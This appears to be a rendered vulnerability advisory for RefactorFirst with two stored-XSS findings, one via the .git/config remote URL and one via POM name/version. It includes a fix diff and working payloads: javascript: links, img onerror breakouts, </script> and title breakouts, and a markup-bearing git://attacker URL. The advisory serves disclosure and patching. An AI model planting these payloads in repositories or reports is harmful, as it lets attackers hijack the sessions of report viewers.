# OpenVuln report — refactorfirst/RefactorFirst

## [high] HTML report origin-URL embedding (GitLogReader.getRepoUrl → unquoted href / DOT-in-script sinks) unvalidated .git/config remote URL leading to stored XSS in the report viewer's browser, with session-class impact when the report is published to an authenticated web origin

- key: `BUG-R2-S2-A1-H1`
- disclosure: owner_only
- cwe: CWE-79
- file: `../change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java`

# HTML report origin-URL embedding (GitLogReader.getRepoUrl → unquoted href / DOT-in-script sinks) unvalidated .git/config remote URL leading to stored XSS in the report viewer's browser, with session-class impact when the report is published to an authenticated web origin

- **Project:** refactorfirst/RefactorFirst
- **Finding key:** BUG-R2-S2-A1-H1
- **CWE:** CWE-79
- **CVSS:** 7.4 (`CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N`)
- **EV priority:** P1
- **EV score:** 7
- **PoC status:** reproduced
- **EXP status:** downgraded
- **Affected versions:** 0.9.0 (latest release, verified: 19 injected sinks per report) through the audited commit
  65d3bef1 (0.10.0-SNAPSHOT); 0.8.0 is not affected (the origin-URL link feature is absent — the raw remote URL appears
  nowhere in its report). CLI jars are not a realistic entry point for any tested version (0.8.0/0.9.0 fail to start
  with a pre-existing picocli bug, as does the audited commit); the Maven plugin goals are the working entry points

## Exploitability rationale

Reachability R:L — the attacker needs control over the analyzed repository's files, specifically its .git/config (its
remote.origin.url). Delivery is verified cheap on all realistic channels: an archive with a pre-built .git (the
.git/config is a plain attacker-authored file), a clone from an attacker-operated git remote (verified over git://: the
markup-bearing URL, spaces included, is stored verbatim into the victim's .git/config), or an attacker superproject's
.gitmodules URL (verified: after a recursive clone the submodule's .git/modules config carries it verbatim and the
report generated inside the submodule injects and executes). Not network-reachable:
the victim must analyze attacker-provided code with the tool — the tool's advertised use case. Exposure E:D — the sink
renders on the default path of every working entry point: the project-header link is emitted unconditionally for both
report types (generateReport:146 -> printProjectHeader:926), even for a repository with zero findings, and the README's
documented flow is the htmlReport/simpleHtmlReport Maven goals. The CLI entry is excluded from exposure: every released
CLI jar (0.8.0/0.9.0 verified) and the audited commit fail to start (pre-existing picocli duplicate --output option), so
the CLI is not a realistic vector. Certainty C:D — pure deterministic string concatenation; a hostile remote.origin.url
reproduces the injected markup every time (re-confirmed on both delivery-path reports: 20 live
<img onerror> elements, 20 dialogs on open). Impact I:S — the realistically achievable top impact is session hijack, not
code execution: on the local file:// view (the documented default) the payload achieves attacker-controlled rendering in
a trusted context (phishing/redirect, proven) plus beacon exfiltration of the report content, while browsers block
local-file reads (proven) and there is no cookie surface; on the GitHub step-summary flow (documented CI flow) GitHub's
sanitizer strips every script shape (verified by simulating the documented allowlist) leaving at most an attacker-chosen
link and a camo-proxied beacon; session-class compromise (reading the hosting origin's data as every viewer, HttpOnly
notwithstanding) is real but requires the victim environment to publish the report into an authenticated web origin — a
standard CI practice for Maven HTML reports that the tool itself does not perform.

## Code anchors

| File                                                                                          | Line | Function               |
|-----------------------------------------------------------------------------------------------|-----:|------------------------|
| `../change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java`                        |   85 | `getOriginUrl`         |
| `../change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java`                        |   88 | `getRepoUrl`           |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                    |  146 | `generateReport`       |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                    |  926 | `printProjectHeader`   |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                    |  756 | `hyperlinkClass`       |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                    | 1037 | `renderDisharmonyInfo` |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                          |  631 | `hyperlinkClassForDot` |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                          |  516 | `generateGraphButtons` |
| `../refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstHtmlReport.java` |   60 | `execute`              |
| `../cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java`                                 |   96 | `call`                 |

## Background

RefactorFirst is a developer/CI-side static-analysis tool (Maven plugin, Gradle plugin, CLI) that mines a project's git
history with JGit, ranks design "disharmonies"
(God Classes, Cycles, ...) by change-proneness vs. effort, and emits an HTML report
(`target/site/refactor-first-report.html`). The report is meant to be opened in a browser and shared; the README
documents viewing it locally and appending it to
`$GITHUB_STEP_SUMMARY` in GitHub Actions. To let readers jump from a finding to the offending source file, the report
generator builds source links from the analyzed repository's git remote: `remote.origin.url` is read from the
repository's `.git/config`
and used as the URL prefix for every class link, disharmony row, and graph node in the report. That remote URL is a
free-form config string that is not part of the repository content checked into a hosting platform, but it *is* part of
what an attacker controls whenever the analyzed project originates from the attacker (a repository archive including
`.git`, a clone from an attacker-operated remote, or a submodule whose URL comes from the attacker-authored
`.gitmodules`). Analyzing third-party code is the tool's advertised primary use case, which puts this input on the
tool's main untrusted input channel.

## Description

`GitLogReader.getOriginUrl()` returns `gitRepository.getConfig().getString("remote",
"origin", "url")` — the raw INI value from the analyzed repository's `.git/config`, returned verbatim by JGit.
`GitLogReader.getRepoUrl()` then applies only three cosmetic transforms: a `git@`→`https://` rewrite (only when the
string starts with
`git@`), a global `.git` substring removal, and a `/blob|/-/blob|/src/<commit-hash>/`
suffix append. There is no scheme allow-list, no character-set validation, and no HTML/JS escaping anywhere on the path.
The resulting string is concatenated raw into markup-significant positions of both HTML report types:

1. **Unquoted `href` attribute** — `printProjectHeader` (SimpleHtmlReport.java:926)
   emits `<a href=` + repoUrl + ` target="_blank">` as the report header, unconditionally for both report types
   (`generateReport` calls it at :146 before any analysis outcome is known, so it renders even for a repo with zero
   findings). The same unquoted shape is used by `hyperlinkClass` (:756) for the class/package/cycle relationship tables
   and by `renderDisharmonyInfo` (:1037-1038) for every row of all disharmony tables. In the HTML tokenizer's
   unquoted-attribute-value state the value terminates at the first whitespace or `>`: a space starts a new attribute
   (event-handler injection, e.g. `onclick=`/`onfocus=… autofocus`), and a `>` closes the start tag so following markup
   such as `<img src=x onerror=alert(1)>` is parsed as a live element that fires on page load with no click.
2. **`javascript:` scheme injection** — a `remote.origin.url` of `javascript:alert(1)//`
   survives all three transforms (no `git@` prefix, no `.git` substring) and the appended `/blob/<hash>/` falls behind
   the JS `//` line comment, yielding a header link `href=javascript:alert(1)//blob/<hash>/` that executes on click. No
   scheme allow-list exists.
3. **Quoted DOT `URL` attribute inside a `<script>` template literal** —
   `HtmlReport.hyperlinkClassForDot` (:631) emits `URL="<repoUrl><path>"` into the DOT graph string that
   `generateGraphButtons` (:516-520) embeds into
   `<script>const X_dot = \`strict digraph G {…}\`;</script>` for the class map, every
   cycle map, and the package map of the full report. A `</script>` sequence in the URL
   terminates the script element at HTML parse time (the script-data state ignores JS
   string context), so the rest of the payload is parsed as live HTML — again
   zero-interaction script execution. A backtick or `${` additionally breaks out of the JS template literal itself.

No defense exists downstream: the only escaping helper in the module,
`escapeHtmlLabel` (SimpleHtmlReport.java:765-767, escapes `& < >`), is applied solely to class-name labels and never to
the URL or any attribute value; `drawTableCell`
(:875-880) does no escaping; the report has no Content-Security-Policy meta tag (`printHead` returns "") while loading ~
8 CDN scripts, so script execution is fully enabled; `ReportWriter.writeReportToDisk` writes the HTML verbatim. The
optional
`minifyHtml` post-pass is off by default in both entry points (Maven mojo field initializer and CLI
`defaultValue="false"`) and is an HTML-parser-based minifier, not an escaper — it re-serializes injected
attributes/elements as markup rather than neutralizing them. GitHub's step-summary surface does sanitize pasted HTML,
but the primary documented flow (opening the local report file) and any web-hosted report (raw-content hosting, internal
quality dashboards, CI artifacts served over HTTP) are unsanitized.

Impact is surface-dependent (all surfaces measured dynamically): on the local file:// view (the README's default flow)
the injected script executes with zero interaction but browsers block file:// subresource reads (verified: fetch (
'file:///…') fails with TypeError) and file:// origins carry no cookies, so the realized impact is attacker-controlled
rendering in a trusted context (phishing/redirect — verified)
plus beacon exfiltration of the report's own content to attacker infrastructure (verified); on the README-documented $
GITHUB_STEP_SUMMARY flow GitHub's user-content sanitizer strips every script shape (verified by simulating the
documented allowlist:
event handlers, <script> blocks and javascript: hrefs all removed), leaving at most an attacker-chosen link and a
camo-proxied image beacon; session-class compromise — the payload reading the hosting origin's data as the signed-in
viewer, HttpOnly notwithstanding, and propagating to every viewer of the shared artifact — is real on web origins that
host the report with sessions (verified on a simulated authenticated report-hosting origin), the standard CI pattern for
publishing Maven HTML reports, but it requires a victim-side publishing step the tool does not perform.

CVSS v3.1 derivation — AV:L: the victim must process attacker-provided local files (the malicious repository/archive)
with a local tool; AC:H: the session-class worst case depends on a condition beyond the attacker's control (the victim
environment must publish the generated report into an authenticated web origin; the documented default flows do not);
PR:N: no privileges on the victim system; UI:R: the victim must run a report goal on the attacker-influenced repository
and open (or host) the generated HTML; S:C: the payload crosses from the tool's file output into the browser's security
domain (XSS); C:H/I:H: on hosting origins the payload acts as every viewing user and reads everything that origin
exposes (verified); A:N: no availability impact beyond the report page itself. → 7.4 (high, conditional).

## Attack

The attacker is the provider of the codebase being analyzed — the tool's advertised use case includes analyzing
third-party code. Delivery paths that put a hostile
`remote.origin.url` into the victim's `.git/config` (all verified dynamically from the victim's side): (1) distribute
the project as an archive that includes a pre-built `.git` directory (vendor drop, file share, email attachment) —
`.git/config`
is a plain attacker-authored file with no git-client sanitization; (2) induce the victim to clone from an
attacker-operated remote whose URL string itself carries the payload — verified over git://: a URL like
`git://attacker/r><img src=x onerror=…>` clones successfully and git stores it verbatim, spaces included (over http (s)
curl rejects space-bearing URLs, but space-free `<>` markup — e.g. inline `<script>` shapes — still clones and stores
verbatim; percent-encoded URLs do not inject because the tool performs no decoding); (3) a superproject whose tracked
`.gitmodules` supplies the submodule origin URL — verified: after a recursive clone the submodule's
`.git/modules/<name>/config`
carries the payload verbatim and the report generated inside the submodule directory (JGit's findGitDir follows the
gitdir pointer) injects and executes it. A CI checkout of a fork PR does not deliver the payload (the checkout keeps the
base repo's origin URL). The victim then runs the tool's normal workflow —
`mvn org.hjug.refactorfirst.plugin:refactor-first-maven-plugin:htmlReport` (or
`simpleHtmlReport`) — and opens the generated report, which the tool itself advertises ("View the report at
target/site/refactor-first-report.html"). The CLI entry funnels into the same renderers but is not a realistic vector:
every released CLI jar (0.8.0/0.9.0 verified) and the audited commit fail to start with a pre-existing, unrelated
picocli bug (duplicate `--output` option); the working entry points are the Maven goals. The attacker also fully
controls the repository content, so the table and graph sinks are guaranteed non-empty; the header sink fires even for
an empty analysis.

What the payload achieves depends on where the report is consumed (all surfaces measured): on the local file:// view
(the documented default) it renders attacker-controlled content in a trusted context — phishing/redirect works
(verified), report-content beacon exfiltration to attacker infrastructure works (verified), but local-file reads are
blocked by the browser (verified) and there is no cookie surface; on the README-documented $GITHUB_STEP_SUMMARY CI flow
GitHub's sanitizer neutralizes the XSS (no script shape survives; residual: attacker-chosen link plus a camo-proxied
image beacon); when the report is published to a web origin — the standard CI pattern for Maven HTML reports
(Jenkins-style HTML report publishing, artifact viewers, internal quality dashboards) and a pattern the project itself
demonstrates by hosting its JUnit 4 sample report on a raw-CDN — the payload runs in that origin for every viewer with
full XSS capability: verified on a simulated authenticated report-hosting origin, where the payload retrieved the
origin's protected data using each viewer's session (HttpOnly notwithstanding — the payload's same-origin fetch rides
the session), read a non-HttpOnly cookie, and exfiltrated everything to attacker infrastructure; on session-less hosting
origins the realized impact is arbitrary rendering for every viewer plus direct viewer-IP/User-Agent disclosure through
beacons.

### Payload

The payload is a single line in the analyzed repository's `.git/config`:
`[remote "origin"] url = <payload>`. Working shapes, all avoiding the `git@`
prefix and the `.git` substring so the cosmetic transforms leave them intact (dynamically reproduced — see poc/poc.md
and poc/evidence/):
(a) scheme injection: `javascript:alert(document.domain)//` — the appended
`/blob/<hash>/` lands behind a JS line comment, producing a click-to-execute link in the report header (and in every
table row / DOT node URL); (b) attribute/element injection via unquoted href:
`https://x/y><img src=x onerror=alert(document.domain)>` — the first `>` closes the `<a` start tag and the
`<img onerror>` fires when the report is merely opened (verified: 20 alert dialogs on load per report in Chrome); (c)
space-separated event handler: `https://x/y onclick=alert(document.domain)//`
— the space ends the unquoted href value and `onclick=…` becomes a live handler attribute on the `<a>`; the trailing
`//` keeps the tool-appended
`/blob/<hash>/` inside a JS line comment so the handler stays executable (verified: 1 alert on clicking the header
link); note that git/JGit truncate an UNQUOTED config value at the first `;`/`#`, so `;`-bearing payloads must avoid
those characters or wrap the value in INI quotes (`url = "…;//"` round-trips verbatim — reproduced with fixture F1-p7);
(d) script-block breakout for the full report's graph sections:
`</script><img src=x onerror=alert(document.domain)>` — the `</script>` sequence ends the
`<script>const X_dot = \`…\`</script>` block at HTML parse time and the
injected element executes without any click (verified: 28 dialogs on load);
a backtick (`` `+alert (…)+` ``) or `${…}` in the URL instead breaks out of the JS
template literal itself and executes during script evaluation (verified: 8
dialogs on load). All shapes require nothing more than the victim opening the
generated `refactor-first-report.html`. Payload grammar in the unquoted-attribute
sinks: the injected handler expression must contain no spaces, no `>` and no quotes
(the unquoted attribute value ends at the first whitespace or `>`, so arrow
functions, `new X` and `return X` are unusable there); full data-theft logic remains
expressible with nested `.then (function (r){…})` chains and fetch/Image beacons — a
payload of this shape was used to steal an authenticated hosting origin's data as the
viewing victim. The DOT-in-`<script>` sinks of the full report have no such constraint.

## Data flow

### Step 1 — `refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstHtmlReport.java:60-77`

Victim runs the htmlReport/simpleHtmlReport mojo on the analyzed project (baseDir = project basedir); the CLI entry
(cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java:96-125, default report type HTML) funnels into the same
renderers.

### Step 2 — `change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java:84-85`

getOriginUrl () returns gitRepository.getConfig ().getString ("remote", "origin", "url") — the raw, free-form
remote.origin.url value from the analyzed repository's .git/config (JGit returns it verbatim).

### Step 3 — `change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java:88-108`

getRepoUrl () applies only cosmetic transforms — git@→https:// rewrite (only for strings starting with git@), global
.git substring removal, /blob|/-/blob|/src/<hash>/ suffix append. No scheme allow-list, no character validation, no
escaping.

### Step 4 — `report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java:360,417-419`

generateReport () obtains the raw repoUrl via getRepoUrl (projectBaseDir) and passes the unmodified string into all
render helpers; printProjectHeader () re-reads it the same way at :918.

### Step 5 — `report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java:926`

Sink 1 — printProjectHeader () emits <a href= + repoUrl + ` target="_blank">` as an unquoted attribute value; called
unconditionally at :146 for both report types. First whitespace or > in repoUrl breaks out of the attribute or the
element (event-handler injection / element injection with onerror).

### Step 6 — `report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java:756,1037-1038`

Sinks 2/3 — hyperlinkClass () (class/package/cycle relationship tables) and renderDisharmonyInfo () (every disharmony
row of all 14 tables) emit the same unquoted-href concatenation; drawTableCell (:875-880) adds no escaping.

### Step 7 — `report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java:631,516-520`

Sink 4 — hyperlinkClassForDot () emits URL="<repoUrl><path>" into the DOT graph string; generateGraphButtons () embeds
that string inside <script>const X_dot = `…`;</script> (class map :489, cycle maps :923, package map :972). A </script>
sequence in repoUrl terminates the script element at HTML parse time and the following markup executes; javascript: URLs
also flow here.

### Step 8 — `report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java:107-112`

Optional minifyHtml post-pass (default false in the Maven mojo and the CLI) — an HTML minifier, not an escaper; no
escaping is applied at any stage.

### Step 9 — `report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java:14-42`

writeReportToDisk () writes the HTML verbatim to target/site/refactor-first-report.html; the report has no
Content-Security-Policy and loads CDN scripts, so the injected markup/JavaScript executes when the victim opens the
file.

## Fix / patch notes

diff --git a/change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java
b/change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java ---
a/change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java +++
b/change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java @@ -94,6 +94,11 @@ public String getRepoUrl ()
throws IOException {

         if (originUrl == null) {
             return "";
         }

+        // Only web URLs may be embedded in generated reports as source links;
+        // anything else (javascript:, data:, file:, ...) is rejected outright.
+        if (!originUrl.startsWith("https://") && !originUrl.startsWith("http://")) {
+            return "";
+        }

         repoUrl = originUrl.replace(".git", "");

@@ -105,5 +110,8 @@ public String getRepoUrl () throws IOException { } else { repoUrl = repoUrl + "/blob/" +
getCurrentCommitHash () + "/"; }

-        return repoUrl;

+        // Keep only RFC 3986 URL characters: drops every char that is markup- or
+        // JS-significant outside a URL (space, ", ', <, >, `, {, }, \), so the value
+        // cannot break out of an attribute or a <script> template literal downstream.
+        return repoUrl.replaceAll("[^A-Za-z0-9._~:/?#\[\]@!$&'()*+,;=%-]", "");
  }

## References

- https://cwe.mitre.org/data/definitions/79.html
- https://cwe.mitre.org/data/definitions/80.html
- https://cwe.mitre.org/data/definitions/20.html
- https://owasp.org/www-community/attacks/xss/
- https://html.spec.whatwg.org/multipage/parsing.html#attribute-value-(unquoted)-state
- https://github.com/advisories/GHSA-8rr6-2qw5-pc7r

---

_Rendered from original VulnHunter / VulnForge `report.yaml` by OpenVuln._

## [high] HTML report generator interpolates analyzed-repo POM project name/version unescaped into report markup (h1 header / title RCDATA / no-disharmony div of htmlReport, simpleHtmlReport and the mvn site goal), enabling stored XSS in the report viewer's browser, with session-class impact when the report is published to an authenticated web origin

- key: `BUG-R2-S2-A1-H2`
- disclosure: owner_only
- cwe: CWE-79
- file: `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`

# HTML report generator interpolates analyzed-repo POM project name/version unescaped into report markup (h1 header / title RCDATA / no-disharmony div of htmlReport, simpleHtmlReport and the mvn site goal), enabling stored XSS in the report viewer's browser, with session-class impact when the report is published to an authenticated web origin

- **Project:** refactorfirst/RefactorFirst
- **Finding key:** BUG-R2-S2-A1-H2
- **CWE:** CWE-79
- **CVSS:** 7.9 (`CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N`)
- **EV priority:** P1
- **EV score:** 7
- **PoC status:** reproduced
- **EXP status:** downgraded
- **Affected versions:** All released versions exposing the htmlReport/simpleHtmlReport goals are affected (measured:
  0.5.0, 0.6.2, 0.8.0, 0.9.0 — the README-pinned version included; 0.4.0 predates the goals), plus the audited
  0.10.0-SNAPSHOT (commit 65d3bef; the Mojo htmlReport/simpleHtmlReport goals and the mvn-site report goal reproduce the
  XSS pristine). The CLI carries the same POM-inference dataflow and is affected where it can start: cli 0.6.2 verified
  affected (6 payload occurrences in the generated full report); cli 0.7.0/0.7.1/0.8.0/0.9.0 and the audited snapshot's
  CLI cannot start at all (pre-existing picocli DuplicateOptionAnnotationsException: the long option --output is
  registered on two picocli fields, ReportCommand.java:56/72), so the Maven goals are the realistic entry points for
  current versions. Full reproduction record: findings/BUG-R2-S2-A1-H2/poc/poc.md; real-scenario impact assessment:
  findings/BUG-R2-S2-A1-H2/exp/exp.md.

## Exploitability rationale

Reachability R:L — the attacker must be the author of the repository the victim analyzes (file-control delivery), but
this is the cheapest channel of the audit's report-XSS family: the payload is two lines of ordinary pom.xml text
(XML-entity encoded, accepted by Maven model building with BUILD SUCCESS), rides in repository CONTENT that survives
every delivery method — any git host, any mirror, a platform
"Download ZIP" (which strips .git entirely), vendor archives — and the same attacker-authored POM can additionally bind
report generation into the victim's routine `mvn verify`/`mvn site` (README "As Part of a Build" pattern; verified for
released 0.9.0 and the audited snapshot: a plain `mvn verify` on the clone generated the poisoned report with no
report-goal invocation). Not unattended-network- reachable: the victim must run the tool on attacker-provided code — the
tool's advertised use case. Exposure E:D — the h1 header sink renders on the default path of every working entry point
of every affected version: the audited snapshot's htmlReport/simpleHtmlReport/mvn-site goals (pristine) and the released
plugin 0.5.0/0.6.2/0.8.0/0.9.0 (measured: 6 payload occurrences per full report, 4 per simple report); the CLI is
excluded from exposure — released CLI 0.7.0+ and the audited commit cannot start (pre-existing picocli duplicate
--output option); only cli 0.6.2 boots, and it is affected via POM inference. Certainty C:D — deterministic string
concatenation; reproduced every time (42/42 collector beacons, 28/28 server-side session ride-alongs across 3 artifact
shapes x 2 viewers, 2/2 zero-interaction dialogs on the git://-delivered artifact). Impact I:S — the realistically
achievable top impact is session hijack, not host code execution: on the local file:// view (the documented default) the
payload achieves attacker-controlled rendering in a trusted context (phishing/redirect + report- content beacon, proven)
while browsers block local-file reads (proven) and there is no cookie surface; on the GitHub step-summary flow
(documented CI flow) GitHub's sanitizer strips every script shape (verified by simulating the documented allowlist),
leaving at most an attacker-chosen link and a camo-proxied beacon; session-class compromise (reading the hosting
origin's data as every viewer, HttpOnly notwithstanding — proven on a simulated Jenkins-HTML-Publisher-style dashboard
for all three artifact shapes, including the mvn site page, which adds the site skin's raw ${project.version} "Version:"
line as an extra sink) is real but requires the victim environment to publish the report into an authenticated web
origin — a standard CI practice for Maven HTML reports that the tool itself does not perform.

## Code anchors

| File                                                                                                | Line | Function                         |
|-----------------------------------------------------------------------------------------------------|-----:|----------------------------------|
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                          |  926 | `printProjectHeader`             |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                          |  364 | `generateReport`                 |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                                |  423 | `printTitle`                     |
| `../cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java`                                       |  169 | `inferArgumentsFromMavenProject` |
| `../refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstHtmlReport.java`       |   44 | `—`                              |
| `../refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstSimpleHtmlReport.java` |   44 | `—`                              |
| `../refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstMavenReport.java`      |   86 | `executeReport`                  |

## Background

RefactorFirst is a static-analysis tool for Java/Kotlin codebases. A developer or CI job runs it against a codebase
(sources + .git history + build files) and it produces a single-file HTML report ranking refactor priorities (cycles,
God classes, etc.). It is consumed three ways: a standalone CLI (`org.hjug.refactorfirst.Main`), direct Maven goals
(`refactorfirst:htmlReport`, `refactorfirst:simpleHtmlReport`), and the `mvn site` report goal
(`RefactorFirstMavenReport`). The report is a persistent artifact (`target/site/refactor-first-report.html`) that the
README explicitly tells users to open in a browser after generation, that the project itself demonstrates hosting on a
script-executing web origin (a rawcdn.githack.com sample report), and that a documented CI flow appends to
`$GITHUB_STEP_SUMMARY`. The security-relevant trust boundary is therefore "analyzed repository → report → whoever views
the report": the tool's own pitch ("This command will analyze Maven and non-Maven projects") means the analyzed
repository — including its `../pom.xml` text — is routinely third-party/untrusted content, while the generated report is
opened by the analyst in a browser. The report generator (`SimpleHtmlReport`/`HtmlReport`) assembles HTML by raw
StringBuilder concatenation and does escape some fields (`escapeHtmlLabel` for class-name labels), but not all.

## Description

The analyzed repository's `<name>` and `<version>` POM values — free-form XML text content under the attacker's full
control in the "analyze a third-party repo" scenario — flow into HTML element bodies of the generated report with no
escaping, validation, or length restriction at any point. Sources: (1) CLI —
`ReportCommand.inferArgumentsFromMavenProject()` silently parses `baseDir/pom.xml` with `MavenXpp3Reader` and takes
`project.getName()`/`project.getVersion()` when the optional `-p`/`-v` flags are unset (the default usage); the CLI only
parses the POM as data, it does not execute the analyzed project's build. (2) Maven goals — `RefactorFirstHtmlReport`/
`RefactorFirstSimpleHtmlReport` declare `@Parameter(defaultValue = "${project.name}")`/`${project.version}`, so running
the goal inside a cloned repo interpolates the attacker's POM values verbatim; direct goal invocation by fully-qualified
coordinates executes only RefactorFirst's own code. (3) The `mvn site` goal `RefactorFirstMavenReport` has the same
defaults and pipes `htmlReport.generateReport(...)` (which contains the same raw header) into `mainSink.rawText(...)`,
which Doxia emits unescaped — only the site goal's `<title>` is escaped, via `mainSink.text(...)`. Sinks (all raw
concatenations, reached on the default code path of every report): `SimpleHtmlReport.printProjectHeader()` builds the
`<h1>` that heads every report of both types with
`"<a href=" + repoUrl + " target=\"_blank\">" + projectName + " " + projectVersion + "</a></h1>"` — the values sit in
element bodies, so `<script>` executes with no breakout; the no-disharmony status branch appends `projectName`/
`projectVersion` raw into a `<div>` body ("Congratulations! ... has no Cycles or Disharmonies!"); and
`HtmlReport.printTitle()` interpolates them into `<title>` (RCDATA — a `</title>` prefix in the payload breaks out and
the following `<script>` executes). The assembled HTML is written verbatim to disk. No mitigating control exists in the
project: the only escape helper (`escapeHtmlLabel`, applied to class-name labels) is not used for the POM-derived
fields; there is no CSP in the generated markup; the optional `minifyHtml` pass is off by default and is a
semantics-preserving compressor (it minifies script content, it does not remove `<script>` elements); and GitHub's
job-summary sanitizer — which strips scripts from one particular delivery surface — is a platform control, not a project
control, and does not cover local viewing or web-hosted reports. CVSS v3.1 derivation (calibrated by the real-scenario
assessment, exp/exp.md): AV:L (the victim must fetch attacker-provided content and run the tool on it — this audit's
convention for the malicious-repo delivery class; the payload itself arrives inside an ordinary clone), AC:H (the
session-class worst case requires the victim environment to publish the report into an authenticated web origin — a
standard Jenkins-HTML-Publisher-style CI practice for this artifact class, but a condition beyond the attacker's
control; the unconditional default-flow impact alone is C:L/I:L, ~6.1 medium), PR:N (no privileges on the victim
system), UI:R (victim runs the tool on the repo and opens the generated report — both are the tool's documented happy
path), S:C (the payload executes in the report viewer's browser/web origin, a security authority beyond the generating
process), C:H/I:H (proven worst case on the hosting surface: same-origin secret retrieval riding every viewer's session,
session id + service secrets + non-HttpOnly cookie exfiltrated, HttpOnly notwithstanding; content manipulation/phishing
on every other surface; no demonstrated host-level compromise), A:N.

## Attack

Attacker persona: the author/host of a repository that a victim analyzes with RefactorFirst. The attacker publishes a
repository whose POM carries the payload (optionally with a trivial source file so the "no disharmonies" status line
also renders). The victim — a developer who received a "please analyze my project" request, or a CI workflow that runs
the tool on fork/community code — executes the tool's documented invocation inside the repo
(`mvn org.hjug.refactorfirst.plugin:refactor-first-maven-plugin:...:htmlReport` or the CLI). The poisoned report is
written to the working tree / CI artifact. Whoever then opens the report (the analyst — as the README instructs — or a
downstream viewer of a committed, uploaded, Pages-published, or githack-served report) executes the attacker's
JavaScript in that browser/origin context. The chain requires no vulnerability on the victim side other than following
the tool's own usage instructions. Real-scenario assessment (exp/exp.md, all surfaces measured end-to-end from the
victim's side): delivery verified on every channel — any clone/mirror/platform zip-export (the payload is ordinary POM
text and needs no `.git` shaping), a clone from an attacker-operated `git://` remote followed by the README's exact
released command (2 zero-interaction script executions on open, the clone's remote URL staying clean — payload
attribution to the POM), and an attacker-POM `<build>` binding that generates the poisoned report during the victim's
plain `mvn verify` with no report-goal invocation. Consumption measured on every surface: authenticated hosting origin —
session ride-along and secrets exfiltration as every viewer on all three README-documented artifact shapes (htmlReport,
simpleHtmlReport, `mvn site` page; the site page additionally interpolates ${project.version} raw into the site skin's
"Version:" line); public raw-CDN-style origin (the hosting pattern the project's own README demonstrates) — full content
defacement under a trusted-looking domain plus phishing link; local `file://` view (the documented default) —
phishing/redirect + report-content beacon, local-file reads blocked by the browser, no cookie surface; GitHub
step-summary flow — sanitized, no script survives (residual: attacker link + camo-proxied beacon). Stealth measured
against a benign control: the payload reports differ only by the injected script elements (+5/+4/+5 across the three
shapes), with zero visible text change and zero dialogs.

### Payload

A two-line `../pom.xml` in a git-initialized repo: `<name>v &lt;script&gt;...payload...&lt;/script&gt;</name>` (XML entity
form keeps the POM well-formed; the parser decodes it to raw markup in memory) plus a `<version>` of the same shape. For
the `<title>` sink the payload is prefixed with `</title>` to exit the RCDATA element, e.g.
`<name>v &lt;/title&gt;&lt;script&gt;...&lt;/script&gt;</name>`; the `<h1>` and `<div>` sinks need no breakout. The repo
needs at least one commit so report generation completes past the git-history reads.

## Data flow

### Step 1 — `<analyzed repo>/pom.xml`

Attacker-controlled source. `<name>`/`<version>` are free-form XML text; writing `&lt;script&gt;...&lt;/script&gt;`
inside them keeps the POM well-formed while the XML parser decodes it to raw markup in memory.

### Step 2 — `cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java:146-179`

CLI source. `inferArgumentsFromMavenProject()` parses `baseDir/pom.xml` with `MavenXpp3Reader` (no validation) and, when
`-p`/`-v` are unset, assigns `projectName = project.getName()` (:169) and `projectVersion = project.getVersion()` (:

172) — raw POM text. Parse-only: no build of the analyzed project is executed.

### Step 3 — `refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstHtmlReport.java:44-49`

Mojo source. `@Parameter(defaultValue = "${project.name}")` / `${project.version}` are interpolated by Maven from the
executing (analyzed) project's POM, verbatim. Same pattern in RefactorFirstSimpleHtmlReport.java:44-49 and
RefactorFirstMavenReport.java:45-49.

### Step 4 — `report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java:77-110`

Propagation. The values travel as plain Strings into SimpleHtmlReport/HtmlReport.execute (...); the only intervening
logic substitutes empty/null with defaults ("my-project"/"0.0.0") — non-empty attacker values pass through untouched.

### Step 5 — `report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java:422-424`

Sink 1 (HTML report types). `printTitle()` returns
`"<title>Refactor First Report for " + projectName + " " + projectVersion + " </title>"` — raw RCDATA interpolation; a
`</title>` prefix in the payload breaks out and the following `<script>` executes during head parsing.
(SimpleHtmlReport.printTitle, :891-893, returns "" — the simple report type relies on sinks 2/3.)

